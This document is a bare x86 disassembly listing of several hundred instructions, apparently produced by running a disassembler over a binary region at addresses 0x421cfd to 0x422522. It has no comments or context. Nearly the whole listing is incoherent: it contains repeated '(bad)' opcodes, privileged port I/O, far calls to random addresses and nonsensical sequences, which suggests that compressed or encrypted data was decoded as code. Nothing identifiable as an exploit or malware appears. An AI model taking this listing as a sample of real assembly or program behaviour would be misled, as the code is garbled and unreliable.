  421cfd:	not    BYTE PTR [eax]
  421cff:	nop
  421d00:	aas    
  421d01:	fld    TBYTE PTR [eax+0x2a43d043]
  421d07:	add    al,0xe
  421d09:	inc    edx
  421d0a:	mov    DWORD PTR [edi+ebx*8+0x53],eax
  421d0e:	pop    es
  421d0f:	jecxz  0x421d65
  421d11:	mov    cl,0x1b
  421d13:	jp     0x421c96
  421d15:	rcr    DWORD PTR [ecx+0x25],0x20
  421d19:	in     eax,dx
  421d1a:	pop    ss
  421d1b:	fisubr DWORD PTR [ebp+0x307e0531]
  421d21:	jns    0x421d80
  421d23:	test   DWORD PTR [esi+0x5b52377d],0xf6825cf3
  421d2d:	inc    ecx
  421d2e:	pop    ds
  421d2f:	scas   eax,DWORD PTR es:[edi]
  421d30:	mov    eax,ds:0x1cad34df
  421d35:	(bad)  
  421d36:	mov    al,ds:0xd7d7d790
  421d3b:	xlat   BYTE PTR ds:[ebx]
  421d3c:	push   0x806ba925
  421d41:	pusha  
  421d42:	or     dl,BYTE PTR [edx]
  421d44:	iret   
  421d45:	ds inc ecx
  421d47:	cmp    edx,ebp
  421d49:	or     cl,bh
  421d4b:	sub    DWORD PTR [edx],ebx
  421d4d:	loope  0x421d4b
  421d4f:	dec    eax
  421d50:	std    
  421d51:	mov    ecx,0xb18ab6e0
  421d56:	or     edi,DWORD PTR [eax+0x12]
  421d59:	xor    ebp,edi
  421d5b:	inc    ecx
  421d5c:	call   0x8edf3523
  421d61:	imul   ebp,DWORD PTR [edx+0x72],0xffffffa9
  421d65:	(bad)  
  421d66:	out    0x39,eax
  421d68:	sar    DWORD PTR [edx],1
  421d6a:	rcl    DWORD PTR [edi-0x12],1
  421d6d:	outs   dx,DWORD PTR ds:[esi]
  421d6e:	pop    ebp
  421d6f:	jp     0x421dac
  421d71:	shl    DWORD PTR [ebp+0x917bcb4],cl
  421d77:	push   ebx
  421d78:	xchg   ecx,eax
  421d79:	ss call 0x83cf:0xcdeb5703
  421d81:	push   edx
  421d82:	and    dl,BYTE PTR [edx-0x29]
  421d85:	nop
  421d86:	mov    ds:0x183d1790,eax
  421d8b:	and    eax,0x9a936095
  421d90:	stos   DWORD PTR es:[edi],eax
  421d91:	mov    esi,ecx
  421d93:	div    DWORD PTR [esp+edx*1-0x35]
  421d97:	(bad)  
  421d98:	and    eax,0xa5d65e5e
  421d9d:	(bad)  
  421d9e:	sbb    edx,DWORD PTR [edx]
  421da0:	pop    esp
  421da1:	in     al,dx
  421da2:	(bad)  
  421da3:	fild   QWORD PTR [edi+0xbc630ae]
  421da9:	imul   ebp,DWORD PTR [ebx+0x5c14f0b5],0x5f
  421db0:	cwde   
  421db1:	adc    DWORD PTR [ebx+0x3f2850fe],esp
  421db7:	call   0x3301bb78
  421dbc:	int    0xf2
  421dbe:	fs stos DWORD PTR es:[edi],eax
  421dc0:	mov    eax,ds:0x4cef3af0
  421dc5:	adc    BYTE PTR [esi+0x1f],al
  421dc8:	loop   0x421d88
  421dca:	repnz repnz outs dx,DWORD PTR ds:[esi]
  421dcd:	push   esp
  421dce:	mov    cl,0x44
  421dd0:	into   
  421dd1:	or     al,BYTE PTR [edx-0x69]
  421dd4:	xchg   ecx,eax
  421dd5:	push   ss
  421dd6:	add    bh,BYTE PTR [eax+0x8]
  421dd9:	sbb    esp,esi
  421ddb:	clc    
  421ddc:	mov    ecx,0x8a4f8e9f
  421de1:	or     DWORD PTR [ebx],esp
  421de3:	cmp    DWORD PTR [eax],eax
  421de5:	mov    esi,0x8fa03240
  421dea:	mov    ch,0xe9
  421dec:	xor    DWORD PTR [edi+eiz*2-0x18],0x11d6a01d
  421df4:	xor    BYTE PTR [ebx],ch
  421df6:	push   0x67
  421df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421df9:	das    
  421dfa:	ja     0x421da0
  421dfc:	das    
  421dfd:	cli    
  421dfe:	inc    ecx
  421dff:	jno    0x421d81
  421e01:	mov    al,0x90
  421e03:	sbb    eax,0xc5a36ee8
  421e08:	pushw  0x8df1
  421e0c:	stos   DWORD PTR es:[edi],eax
  421e0d:	cmp    BYTE PTR [ecx],bh
  421e0f:	out    0xc7,eax
  421e11:	lds    esi,FWORD PTR [esi+0x2f47654e]
  421e17:	(bad)  
  421e19:	push   eax
  421e1a:	nop
  421e1b:	xchg   esp,eax
  421e1c:	inc    edi
  421e1d:	cs fwait
  421e1f:	jnp    0x421de2
  421e21:	std    
  421e22:	les    eax,FWORD PTR [ecx-0x70828410]
  421e28:	aam    0x64
  421e2a:	test   DWORD PTR [eax+0x3a],ebp
  421e2d:	mov    ecx,0xd6f679bc
  421e32:	addr16 int 0xb8
  421e35:	call   0xe40:0xe4deebad
  421e3c:	jne    0x421e14
  421e3e:	mov    DWORD PTR [edx+0x2a0dfe9e],ebx
  421e44:	inc    edi
  421e45:	retf   0xc6f8
  421e48:	add    al,BYTE PTR [eax+0x1a4ae815]
  421e4e:	cs out 0xa4,eax
  421e51:	or     DWORD PTR es:[esi-0x31071b93],0x5a
  421e59:	sbb    eax,0x5a7245e3
  421e5e:	jg     0x421e4c
  421e60:	pop    ecx
  421e61:	jne    0x421df2
  421e63:	bound  esp,QWORD PTR [eax-0x2d0cc717]
  421e69:	lea    esp,[edx+0x0]
  421e6c:	arpl   WORD PTR [esi-0x44],sp
  421e6f:	pusha  
  421e70:	push   ebp
  421e71:	rol    DWORD PTR [ebx],0x98
  421e74:	dec    esp
  421e75:	sub    bl,BYTE PTR [ecx+0x77525371]
  421e7b:	add    esp,DWORD PTR [ebx]
  421e7d:	or     BYTE PTR [eax+eax*1],dl
  421e80:	xchg   ebp,eax
  421e81:	inc    ecx
  421e82:	loop   0x421ead
  421e84:	mov    cl,0xa6
  421e86:	sbb    eax,0xef822d71
  421e8b:	nop
  421e8c:	(bad)  
  421e8d:	cmp    dh,BYTE PTR [ecx]
  421e8f:	sbb    esp,esi
  421e91:	retf   
  421e92:	jno    0x421e69
  421e94:	adc    ecx,DWORD PTR [edi-0x17c72605]
  421e9a:	popa   
  421e9b:	pop    ds
  421e9c:	sbb    eax,0xe901ae6
  421ea1:	pop    eax
  421ea2:	ret    0x2dda
  421ea5:	xchg   ebx,eax
  421ea6:	and    esi,DWORD PTR [edi-0x76b576db]
  421eac:	cmp    BYTE PTR [ecx],al
  421eae:	in     al,dx
  421eaf:	shl    cl,1
  421eb1:	int    0x9f
  421eb3:	ja     0x421e65
  421eb5:	dec    esi
  421eb6:	sar    DWORD PTR [eax+0x4f2f83ac],1
  421ebc:	or     DWORD PTR [ebx-0x4af8055b],0x1b36f9c1
  421ec6:	pop    esp
  421ec7:	lahf   
  421ec8:	pop    ss
  421ec9:	dec    ebp
  421eca:	push   es
  421ecb:	adc    BYTE PTR ds:0x1c8d7878,0x2d
  421ed2:	xor    bl,BYTE PTR [edx+edi*8]
  421ed5:	lock jmp 0x421f25
  421ed8:	sub    DWORD PTR [ebx-0x2a50307c],esp
  421ede:	push   esp
  421edf:	sahf   
  421ee0:	neg    ebx
  421ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ee3:	mov    ebx,0xaf02e506
  421ee8:	push   ebp
  421ee9:	xor    eax,DWORD PTR [edx+0x7b3dfac1]
  421eef:	jg     0x421ea9
  421ef1:	cs mov bl,0x73
  421ef4:	int3   
  421ef5:	push   0xffffffa5
  421ef7:	jns    0x421f09
  421ef9:	cmp    bh,BYTE PTR [edi]
  421efb:	xchg   ah,al
  421efd:	in     al,dx
  421efe:	jle    0x421ead
  421f00:	pop    ebx
  421f01:	push   eax
  421f02:	xchg   DWORD PTR [ebx],eax
  421f04:	mov    edi,0xcda7bdda
  421f09:	xor    BYTE PTR [eax+0x362edc4d],ch
  421f0f:	dec    esp
  421f10:	jmp    0xeed8836b
  421f15:	out    0xa6,al
  421f17:	jle    0x421f47
  421f19:	and    bh,bh
  421f1b:	rcl    BYTE PTR [edi],1
  421f1d:	push   edi
  421f1e:	jge    0x421f25
  421f20:	xchg   edx,eax
  421f21:	imul   edi,DWORD PTR [eax-0x7e30114b],0x4d386b6f
  421f2b:	adc    ebp,DWORD PTR [ebx+0x776626e1]
  421f31:	mov    edi,0xc4ae5d5f
  421f36:	addr16 ds cs pop ss
  421f3a:	imul   DWORD PTR [eax+0xd]
  421f3d:	or     edi,DWORD PTR [ebx]
  421f3f:	aam    0x1b
  421f41:	dec    esp
  421f42:	sub    DWORD PTR [eax-0x22],esi
  421f45:	pop    ds
  421f46:	mov    edx,0x35597ac9
  421f4b:	and    esp,DWORD PTR ds:0xf51705bc
  421f51:	mov    cl,0x26
  421f53:	pusha  
  421f54:	(bad)  
  421f55:	cmp    eax,0xbf332f14
  421f5a:	imul   DWORD PTR [ecx-0x24c189ef]
  421f60:	inc    esi
  421f61:	adc    bl,BYTE PTR [esi-0xc]
  421f64:	mov    BYTE PTR [eax-0x7f683261],bh
  421f6a:	add    eax,0x60100942
  421f6f:	sar    DWORD PTR [eax+0x4dd4a492],1
  421f75:	mov    al,ds:0x3c13d6e8
  421f7a:	sbb    al,0x66
  421f7c:	call   0x6e31:0x697be0c0
  421f83:	fld    DWORD PTR [ecx-0x4dfe8c48]
  421f89:	or     eax,0x2b60bd3e
  421f8e:	cld    
  421f8f:	int3   
  421f90:	int3   
  421f91:	fcomp  QWORD PTR [eax-0x42edc141]
  421f97:	lds    ebx,FWORD PTR [ebp+0x2a]
  421f9a:	jbe    0x421fa6
  421f9c:	(bad)  
  421f9d:	pop    esp
  421f9e:	les    ebp,FWORD PTR [edx+0x118aa174]
  421fa4:	(bad)  
  421fa5:	mov    ds:0x98ffe8aa,eax
  421faa:	out    0x46,al
  421fac:	lea    ebx,[ebx+0x23e7c39f]
  421fb2:	or     eax,0x62444510
  421fb7:	jae    0x421f78
  421fb9:	fbstp  TBYTE PTR [ecx]
  421fbb:	mov    ds:0x9125b15b,al
  421fc0:	pop    esi
  421fc1:	xchg   edi,eax
  421fc2:	daa    
  421fc3:	fs push ebx
  421fc5:	dec    edx
  421fc6:	movq   mm7,QWORD PTR [ebp-0x53ec2839]
  421fcd:	stos   BYTE PTR es:[edi],al
  421fce:	sahf   
  421fcf:	mov    al,0x59
  421fd1:	jno    0x422014
  421fd3:	jmp    0x421f63
  421fd5:	test   eax,0x6e7d1f6b
  421fda:	sub    eax,DWORD PTR [esi]
  421fdc:	adc    DWORD PTR [eax-0x38],edi
  421fdf:	inc    edx
  421fe0:	add    al,0xdb
  421fe2:	in     al,dx
  421fe3:	les    ecx,FWORD PTR [ebx+0x40]
  421fe6:	push   ds
  421fe7:	ja     0x42201f
  421fe9:	adc    DWORD PTR [esi+0x1aed9f93],esp
  421fef:	jae    0x421f85
  421ff1:	sub    DWORD PTR [eax-0x64],ecx
  421ff4:	xchg   esi,eax
  421ff5:	jbe    0x42206d
  421ff7:	push   edx
  421ff8:	cmc    
  421ff9:	sbb    al,bl
  421ffb:	push   eax
  421ffc:	jge    0x421fea
  421ffe:	mov    WORD PTR [edi-0x36],ds
  422001:	rcr    DWORD PTR [eax-0x8d4ad41],cl
  422007:	lds    ebx,FWORD PTR [edx-0x263b2a9d]
  42200d:	xor    esp,DWORD PTR [edi-0x11]
  422010:	fist   DWORD PTR [ecx+0x1d]
  422013:	xor    DWORD PTR [ebp+0x7efd63fa],0x1c
  42201a:	(bad)  [eax+0x5cf746dc]
  422020:	fst    st(1)
  422022:	fsubrp st(6),st
  422024:	cmp    dl,BYTE PTR [esi]
  422026:	mov    edi,0xee6a3356
  42202b:	add    DWORD PTR [ecx+0x7f],edi
  42202e:	ja     0x421fb9
  422030:	xor    BYTE PTR [eax],bh
  422032:	pop    edx
  422033:	test   al,0xd
  422035:	into   
  422036:	test   DWORD PTR [eax],ecx
  422038:	or     esi,DWORD PTR [eax]
  42203a:	add    esp,edx
  42203c:	cmp    cl,ch
  42203e:	push   esp
  42203f:	xchg   esi,eax
  422040:	rcr    BYTE PTR [ecx+0x44d51216],1
  422046:	sub    dh,BYTE PTR [ebx+0x12]
  422049:	stc    
  42204a:	add    ah,BYTE PTR [esi]
  42204c:	js     0x422054
  42204e:	mov    ah,0x56
  422050:	fsub   DWORD PTR [ecx+0xb]
  422053:	sbb    edx,ecx
  422055:	and    al,0xcb
  422057:	pop    eax
  422058:	sti    
  422059:	rcr    BYTE PTR [edi-0x3030273],0xc5
  422060:	call   0xb035:0xfa44c172
  422067:	dec    ecx
  422068:	sub    dl,0x33
  42206b:	enter  0x4758,0x4
  42206f:	mov    bh,0x64
  422071:	add    DWORD PTR [ebp+0x59fa518c],edx
  422077:	adc    BYTE PTR [edi+0x5e555d4c],bl
  42207d:	dec    esi
  42207e:	dec    edi
  42207f:	nop
  422080:	out    0x5b,al
  422082:	retf   
  422083:	mov    dl,BYTE PTR [eax-0x57]
  422086:	hlt    
  422087:	adc    al,0xaa
  422089:	cmp    ecx,DWORD PTR [edx-0x7]
  42208c:	pop    eax
  42208d:	jns    0x4220ab
  42208f:	inc    ebp
  422090:	jno    0x422082
  422092:	sti    
  422093:	int3   
  422094:	mov    ah,0xba
  422096:	ffree  st(7)
  422098:	test   eax,0x95d9556e
  42209d:	xchg   ecx,eax
  42209e:	frndint 
  4220a0:	imul   edi,DWORD PTR [esp+esi*8-0x42],0xffffffba
  4220a5:	sub    al,al
  4220a7:	je     0x422097
  4220a9:	mov    WORD PTR [eax-0x2a80d502],gs
  4220af:	ja     0x422052
  4220b1:	jbe    0x611787ef
  4220b7:	push   ebx
  4220b8:	mov    bx,0x245
  4220bc:	(bad)  
  4220bd:	lahf   
  4220be:	cmc    
  4220bf:	cmp    esi,DWORD PTR [ebx+edx*8]
  4220c2:	push   0xffffffdf
  4220c4:	pop    edi
  4220c5:	enter  0xf51f,0x1b
  4220c9:	mov    BYTE PTR [edx-0x3d51a03],cl
  4220cf:	bound  esp,QWORD PTR [edi]
  4220d1:	jle    0x4220e5
  4220d3:	xor    al,al
  4220d5:	jmp    0x15a20082
  4220da:	pop    esp
  4220db:	sbb    ah,BYTE PTR [ebp+0x5a]
  4220de:	int    0xbe
  4220e0:	sbb    eax,0xba3658b9
  4220e5:	mov    ebx,0x518772c9
  4220ea:	call   0x6e0aa024
  4220ef:	lock or dl,bh
  4220f2:	jecxz  0x4220a5
  4220f4:	jl     0x4220a6
  4220f6:	je     0x422089
  4220f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220f9:	daa    
  4220fa:	ja     0x4220c4
  4220fc:	xchg   BYTE PTR [si],al
  4220ff:	dec    ebp
  422100:	mov    cs,WORD PTR [ebp-0x4da6f81b]
  422106:	loopne 0x42214a
  422108:	cmp    eax,0x3abf81d
  42210d:	push   ss
  42210e:	sub    cl,ah
  422110:	fs jb  0x422095
  422113:	xor    DWORD PTR [ecx],ebx
  422115:	adc    al,0x68
  422117:	out    dx,al
  422118:	(bad)  
  422119:	jmp    0x6c8e:0xc2a25c35
  422120:	cwde   
  422121:	mov    DWORD PTR [ebp+0x70e910ed],eax
  422127:	jmp    0xa6c9cdf1
  42212c:	sahf   
  42212d:	and    al,0x18
  42212f:	out    0xbc,al
  422131:	arpl   WORD PTR [esp+ebp*4],dx
  422134:	mov    WORD PTR [esi+0xe],?
  422137:	lahf   
  422138:	and    eax,0x17aa9473
  42213d:	mov    eax,DWORD PTR [ebx+0x3eb4a54e]
  422143:	xor    DWORD PTR [edi+esi*2],ebx
  422146:	mov    dh,al
  422148:	mov    DWORD PTR [ebp+0x50],edi
  42214b:	push   ecx
  42214c:	push   esi
  42214d:	ror    BYTE PTR [edx+0x1a0f981d],cl
  422153:	lods   al,BYTE PTR ds:[esi]
  422154:	mov    fs,WORD PTR [ecx]
  422156:	inc    esi
  422157:	dec    edi
  422158:	push   ebx
  422159:	xor    DWORD PTR [ebx+0x46daabe7],0x3955734b
  422163:	repz cmp eax,0xb9c58640
  422169:	ds pop ebp
  42216b:	pop    ss
  42216c:	rcr    DWORD PTR [esi+0x64],1
  42216f:	xchg   edi,eax
  422170:	fs adc bl,0x2a
  422174:	jnp    0x4221b7
  422176:	daa    
  422177:	pop    eax
  422178:	cmp    DWORD PTR [esi-0x52],eax
  42217b:	pop    es
  42217c:	push   ss
  42217d:	retf   0xded2
  422180:	pop    eax
  422181:	xor    eax,DWORD PTR [ebx]
  422183:	std    
  422184:	pusha  
  422185:	and    al,BYTE PTR [esi+0x4982979f]
  42218b:	inc    edx
  42218c:	call   0xee7c3a59
  422191:	and    al,0xc
  422193:	icebp  
  422194:	xchg   ecx,eax
  422195:	cs jl  0x422160
  422198:	pop    ds
  422199:	es mov edx,0x7f79a454
  42219f:	lods   eax,DWORD PTR ds:[esi]
  4221a0:	cmp    eax,0xd5afef90
  4221a5:	pop    edx
  4221a6:	and    bl,BYTE PTR [ebx]
  4221a8:	repnz lds ebx,FWORD PTR [eax-0x7d917ae3]
  4221af:	add    ebx,ecx
  4221b1:	cmp    ch,al
  4221b3:	int    0xe2
  4221b5:	adc    eax,0x6ba1a5ed
  4221ba:	push   cs
  4221bb:	lahf   
  4221bc:	psubsw mm6,mm1
  4221bf:	fistp  DWORD PTR [edx]
  4221c1:	jl     0x42223b
  4221c3:	icebp  
  4221c4:	mov    al,ds:0x54a52eff
  4221c9:	lea    esi,[ecx-0x23]
  4221cc:	sub    edx,DWORD PTR [ecx]
  4221ce:	push   esp
  4221cf:	inc    ebx
  4221d0:	cs btr edi,edx
  4221d4:	ins    DWORD PTR es:[edi],dx
  4221d5:	or     eax,0xdfe9ba76
  4221da:	xchg   ecx,eax
  4221db:	ds mov bl,0x51
  4221de:	jg     0x4221c4
  4221e0:	inc    ecx
  4221e1:	cmp    al,0x32
  4221e3:	and    al,0xef
  4221e5:	rcl    DWORD PTR [edi],1
  4221e7:	and    BYTE PTR [esi+0x76],ah
  4221ea:	pop    ds
  4221eb:	pop    es
  4221ec:	mov    esi,0x26894a2a
  4221f1:	es popf 
  4221f3:	mov    eax,ds:0xb8f443e0
  4221f8:	mov    edi,0x85b035d6
  4221fd:	out    0x6c,eax
  4221ff:	jg     0x422230
  422201:	dec    ebp
  422202:	adc    eax,0xd74e7532
  422207:	mov    ah,0x7d
  422209:	inc    esp
  42220a:	dec    eax
  42220b:	adc    eax,0x13e3cf1
  422210:	call   0x2055d8e8
  422215:	inc    esp
  422216:	fld    QWORD PTR [esi+0x2d6738d3]
  42221c:	test   DWORD PTR [edi+eiz*4],ecx
  42221f:	sar    bh,0xa8
  422222:	xor    eax,0xf3e8e2cc
  422227:	jl     0x422225
  422229:	cs and al,0xd3
  42222c:	mov    ecx,0xdad363ef
  422231:	xchg   BYTE PTR [eax+0x14],dl
  422234:	push   cs
  422235:	add    al,0xf1
  422237:	or     eax,0x63e4dea0
  42223c:	shl    dl,1
  42223e:	ins    DWORD PTR es:[edi],dx
  42223f:	pop    eax
  422240:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  422242:	dec    edi
  422243:	sar    DWORD PTR [esp+ebx*1],1
  422246:	xchg   ebp,eax
  422247:	daa    
  422248:	xchg   BYTE PTR [edi+esi*1],bh
  42224b:	cmovs  edi,DWORD PTR cs:[ebx+edi*1+0x4d]
  422251:	jge    0x42229c
  422253:	push   eax
  422254:	jmp    0xe9a1:0x9ec0704c
  42225b:	iret   
  42225c:	mov    eax,ds:0x1869d882
  422261:	jns    0x4222c8
  422263:	ds mov edi,0x852863ba
  422269:	sub    eax,0xfdb9aa07
  42226e:	sbb    eax,0x8582e251
  422273:	or     ebx,eax
  422275:	hlt    
  422276:	sar    DWORD PTR [edx+0x6b6066d3],cl
  42227c:	pop    ebx
  42227d:	stos   DWORD PTR es:[edi],eax
  42227e:	sbb    eax,0xa730ded7
  422283:	jb     0x422260
  422285:	pop    edx
  422286:	xchg   edi,eax
  422287:	fsub   DWORD PTR [eax+eax*1]
  42228a:	aad    0xc4
  42228c:	fwait
  42228d:	xor    cl,dl
  42228f:	pusha  
  422290:	sub    dh,BYTE PTR [edi-0x10]
  422293:	cmp    BYTE PTR [ebx-0x49],0xef
  422297:	sbb    eax,0x3521821b
  42229c:	rol    DWORD PTR [eax*1+0x6ca46408],1
  4222a3:	sar    BYTE PTR [eax+0x22],1
  4222a6:	scas   al,BYTE PTR es:[edi]
  4222a7:	pop    eax
  4222a8:	inc    esi
  4222a9:	pop    esp
  4222aa:	out    dx,eax
  4222ab:	mov    edx,0xe133c575
  4222b0:	fdiv   DWORD PTR [ecx-0x3c02bfd9]
  4222b6:	neg    BYTE PTR [edx-0x77]
  4222b9:	ffreep st(6)
  4222bb:	jnp    0x4222b6
  4222bd:	in     eax,0x21
  4222bf:	mov    ebp,0x123a9ede
  4222c4:	and    al,0xaf
  4222c6:	out    dx,eax
  4222c7:	ins    DWORD PTR es:[edi],dx
  4222c8:	pushf  
  4222c9:	and    DWORD PTR [edx+0x24],ebp
  4222cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222ce:	fisub  WORD PTR [edi-0x37d79e96]
  4222d4:	mov    ds:0x481a859f,eax
  4222d9:	aaa    
  4222da:	cmp    eax,0x6250d651
  4222df:	es (bad) 
  4222e1:	fcom   st(2)
  4222e3:	bound  esp,QWORD PTR [ecx-0x7a87fa63]
  4222e9:	sub    bl,BYTE PTR [ebp+0x57639691]
  4222ef:	sbb    al,0xf0
  4222f1:	mov    edi,0xf9b77e4b
  4222f6:	jmp    0x760685b3
  4222fb:	imul   esi,DWORD PTR ds:0x492900f0,0xffffffd3
  422302:	ins    BYTE PTR es:[edi],dx
  422303:	cmp    BYTE PTR [esi-0x14],dh
  422306:	inc    ebp
  422307:	cdq    
  422308:	aas    
  422309:	fmul   DWORD PTR [ebx+0x4a]
  42230c:	mov    dl,0xe6
  42230e:	jmp    0x422379
  422310:	mov    edi,0xc7cf7bf4
  422315:	(bad)  
  422316:	sbb    al,0xfb
  422318:	dec    eax
  422319:	cwde   
  42231a:	inc    ecx
  42231b:	iret   
  42231c:	(bad)  
  42231d:	mov    esp,0xd14d927b
  422322:	fcom   QWORD PTR [ebx+0x14086d9f]
  422328:	adc    eax,DWORD PTR [edx+0x43]
  42232b:	cmp    BYTE PTR [ecx],ah
  42232d:	mov    ds:0xdb349af3,al
  422332:	aaa    
  422333:	mov    eax,ds:0x1fc9c9b7
  422338:	cmp    al,cl
  42233a:	pop    ebx
  42233b:	sub    DWORD PTR [edx+0x861de82],esi
  422341:	xlat   BYTE PTR ds:[ebx]
  422342:	loopne 0x422341
  422344:	pop    ebp
  422345:	pop    ds
  422346:	test   DWORD PTR [edx-0x4ef84364],esi
  42234c:	das    
  42234d:	ja     0x422302
  42234f:	stc    
  422350:	iret   
  422351:	lock dec edi
  422353:	sahf   
  422354:	ds jl  0x4222f6
  422357:	cmp    eax,0x5ce0a93
  42235c:	inc    ebx
  42235d:	or     BYTE PTR [esp+eiz*4-0x1d291538],bl
  422364:	in     al,0xb3
  422366:	dec    BYTE PTR [edi+ecx*2+0x7a]
  42236a:	shl    DWORD PTR [esi],1
  42236c:	in     al,0xe1
  42236e:	popa   
  42236f:	rcr    BYTE PTR ss:[edx],0x18
  422373:	dec    edx
  422374:	pushf  
  422375:	daa    
  422376:	pop    ebp
  422377:	leave  
  422378:	and    al,0x7a
  42237a:	mov    ch,0x58
  42237c:	sub    al,0x49
  42237e:	pop    edi
  42237f:	dec    esi
  422380:	xchg   DWORD PTR [eax-0x72],ecx
  422383:	jae    0x4223c6
  422385:	int    0x73
  422387:	and    DWORD PTR fs:[edi+0x41a8c63e],edi
  42238e:	cdq    
  42238f:	jl     0x422337
  422391:	xchg   ebp,eax
  422392:	jnp    0x42240d
  422394:	mov    al,ds:0xf621055b
  422399:	mov    al,ds:0xd937f815
  42239e:	mov    esi,0xe18e8845
  4223a3:	inc    eax
  4223a4:	popf   
  4223a5:	mov    bh,0xb9
  4223a7:	jg     0x422360
  4223a9:	sub    eax,0x66a2fe11
  4223ae:	rcr    DWORD PTR [edx+0x78da2c1b],1
  4223b4:	sbb    dl,al
  4223b6:	pop    esp
  4223b7:	add    DWORD PTR [eax+eax*2],ecx
  4223ba:	add    dh,ch
  4223bc:	pop    edi
  4223bd:	and    al,0x33
  4223bf:	pop    edi
  4223c0:	mov    sp,0x3280
  4223c4:	loope  0x422436
  4223c6:	mov    ah,0xce
  4223c8:	in     al,dx
  4223c9:	arpl   cx,bp
  4223cb:	(bad)  
  4223cc:	pop    edi
  4223cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223ce:	sbb    DWORD PTR [edx-0x28af6d7a],0x40
  4223d5:	in     al,0x5c
  4223d7:	cmp    bl,bh
  4223d9:	mov    ecx,0xf0e5984b
  4223de:	sub    esp,eax
  4223e0:	dec    esi
  4223e1:	push   edx
  4223e2:	aaa    
  4223e3:	addr16 (bad) 
  4223e5:	inc    eax
  4223e6:	mov    al,0x9e
  4223e8:	out    0x99,al
  4223ea:	or     WORD PTR [esi+0x32],bp
  4223ee:	test   al,0x57
  4223f0:	aam    0x84
  4223f2:	ds xor dl,0x89
  4223f6:	dec    ebx
  4223f7:	scas   eax,DWORD PTR es:[edi]
  4223f8:	add    al,0x1
  4223fa:	and    edi,esp
  4223fc:	cmp    BYTE PTR [edi+0x7],bl
  4223ff:	inc    ebx
  422400:	nop
  422401:	test   eax,0x7e40381f
  422406:	sbb    edx,ebx
  422408:	push   es
  422409:	(bad)  
  42240a:	ds cmp al,0x22
  42240d:	inc    edi
  42240e:	shl    DWORD PTR [ebp+0x2b],1
  422411:	hlt    
  422412:	adc    ecx,0xb7c3f344
  422418:	dec    esi
  422419:	fbstp  TBYTE PTR [ebp-0x48]
  42241c:	push   ss
  42241d:	sbb    DWORD PTR [edi+0x3b9b624c],edi
  422423:	push   ecx
  422424:	fisub  DWORD PTR [edx+eax*4+0x4acb7bff]
  42242b:	out    dx,eax
  42242c:	ret    0x25a
  42242f:	jecxz  0x422464
  422431:	ror    ebp,0x51
  422434:	mov    dl,0x3b
  422436:	mov    ecx,0xf1c5aa7
  42243b:	adc    ebp,ebx
  42243d:	outs   dx,BYTE PTR ds:[esi]
  42243e:	fs or  ebp,0xffffffed
  422442:	sbb    dl,BYTE PTR ds:0x5e07a2dc
  422448:	xchg   DWORD PTR gs:[esi+0x73],ecx
  42244c:	add    dh,BYTE PTR [edx-0x4011eefe]
  422452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422453:	pop    edx
  422454:	into   
  422455:	push   DWORD PTR [esi]
  422457:	jo     0x422450
  422459:	adc    al,0x77
  42245b:	in     al,0x6c
  42245d:	loop   0x422481
  42245f:	pusha  
  422460:	add    dh,0x3
  422463:	add    bl,BYTE PTR [ebx-0x5f5b51a]
  422469:	mov    al,ds:0xed507ef0
  42246e:	cli    
  42246f:	into   
  422470:	pop    edx
  422471:	popa   
  422472:	leave  
  422473:	imul   eax,DWORD PTR ds:0xcebceb40,0x58ad516d
  42247d:	jns    0x4224a3
  42247f:	and    edi,DWORD PTR [edi-0x7d]
  422482:	push   0xd1c38bf6
  422487:	in     eax,dx
  422488:	adc    al,0xd0
  42248a:	dec    edx
  42248b:	pop    edx
  42248c:	sti    
  42248d:	gs pop esi
  42248f:	dec    esp
  422490:	or     al,0x88
  422492:	cmp    BYTE PTR [eax+0x2c],bh
  422495:	cwde   
  422496:	mov    edi,0xb854df1c
  42249b:	jae    0x422516
  42249d:	fcomp  QWORD PTR [ecx-0x2e]
  4224a0:	lods   al,BYTE PTR ds:[esi]
  4224a1:	xor    BYTE PTR [ebp+0x4c],ah
  4224a4:	or     al,0x17
  4224a6:	or     al,ah
  4224a8:	stos   BYTE PTR es:[edi],al
  4224a9:	fcomp  QWORD PTR [eax]
  4224ab:	add    DWORD PTR [esi],esi
  4224ad:	pop    ebx
  4224ae:	dec    ecx
  4224af:	dec    edi
  4224b0:	mov    ebp,0xbe10115e
  4224b5:	mov    ecx,0xcb047354
  4224ba:	sbb    al,0x86
  4224bc:	stos   DWORD PTR es:[edi],eax
  4224bd:	shl    BYTE PTR [esi],0xa7
  4224c0:	shl    DWORD PTR [ebx-0x64b900e9],cl
  4224c6:	fs ret 0xe4d3
  4224ca:	daa    
  4224cb:	(bad)  
  4224cd:	mov    al,0x32
  4224cf:	add    eax,0x4ff78816
  4224d4:	push   ebp
  4224d5:	jne    0x422508
  4224d7:	sub    al,0x20
  4224d9:	stos   DWORD PTR es:[edi],eax
  4224da:	or     al,0xea
  4224dc:	pop    esp
  4224dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224de:	out    dx,eax
  4224df:	sub    al,0xa3
  4224e1:	rcr    BYTE PTR [edi-0x1620d0cc],1
  4224e7:	test   al,0xff
  4224e9:	popa   
  4224ea:	jl     0x422514
  4224ec:	pop    ebp
  4224ed:	gs adc edx,ebx
  4224f0:	dec    ebp
  4224f1:	mov    edx,DWORD PTR [ebx-0x626e3167]
  4224f7:	mov    ebx,0x4631c691
  4224fc:	loope  0x422543
  4224fe:	mov    ecx,0x7551f301
  422503:	setle  bl
  422506:	pop    DWORD PTR [ecx-0x44]
  422509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42250a:	aas    
  42250b:	mov    esi,0x70114acd
  422510:	cdq    
  422511:	cli    
  422512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422513:	pop    ds
  422514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422516:	stc    
  422517:	add    dh,ch
  422519:	mov    bh,0x17
  42251b:	mov    dl,BYTE PTR [edi-0x7c6eebe1]
  422521:	xchg   edx,eax
  422522:	dec    eax
